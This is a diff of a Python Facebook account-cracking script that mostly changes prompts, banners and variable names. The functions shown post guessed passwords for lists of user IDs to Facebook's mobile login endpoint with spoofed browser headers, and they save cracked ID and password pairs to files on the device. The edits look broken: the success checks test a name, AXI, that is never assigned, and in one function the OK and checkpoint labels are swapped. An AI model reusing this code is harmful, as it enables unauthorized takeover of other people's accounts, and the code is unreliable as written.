@@ -345,6 +345,7 @@ def public():
 	try:
 		plist = []
 		try:
+			linex()
 			ps_limit = int(input(' How many passwords do you want to add ? '))
 		except:
 			ps_limit =1
@@ -634,7 +635,8 @@ def menu():
 		plist = []
 		clear()
 		try:
-			ps_limit = int(input(' How many passwords do you want to add ? '))
+			linex()
+			ps_limit = int(input('\x1b[1;92m How many passwords do you want to add ? '))
 		except:
 			ps_limit =1
 		linex()
@@ -1473,14 +1475,14 @@ def ffb7(ids,names,passlist):
 			idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://p.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			SHAHBAZ=session.cookies.get_dict().keys()
-			if "c_user" in SHAHBAZ:
+			if "c_user" in AXI:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
 				open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SHAHBAZ:
+			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 					open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
@@ -1496,7 +1498,7 @@ def ffb7(ids,names,passlist):
 
 def ffb8(ids,names,passlist):
 	global loop,oks,cps
-	sys.stdout.write('\r\r\033[1;37m[UZZAL / GS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
+	sys.stdout.write('\r\r\033[1;32m [GS XD ᗙ] %s|\033[1;32mOK:-%s \033[1;32m'%(loop,len(oks)));sys.stdout.flush()
 	session = requests.Session()
 	try:
 		first = names.split(' ')[0]
@@ -1515,12 +1517,12 @@ def ffb8(ids,names,passlist):
 			head = {'Host': 'p.facebook.com', 'viewport-width': '980', 'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="105", "Google Chrome";v="105"', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			SHAHBAZ=session.cookies.get_dict().keys()
-			if "c_user" in SHAHBAZ:
+			if "c_user" in AXI:
 				print('\r\r\x1b[38;5;208m [GS XD-CP] '+ids+' | '+pas+'\033[1;97m')
 				open('/sdcard/GS XD-CP.txt', 'a').write(ids+'|'+pas+'\n')
 				oks.append(ids)
 				break
-			elif 'checkpoint' in SHAHBAZ:
+			elif 'checkpoint' in AXI:
 				if 'y' in pcp:
 					print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
 					open('/sdcard/GS XD-OK.txt', 'a').write(ids+'|'+pas+'\n')
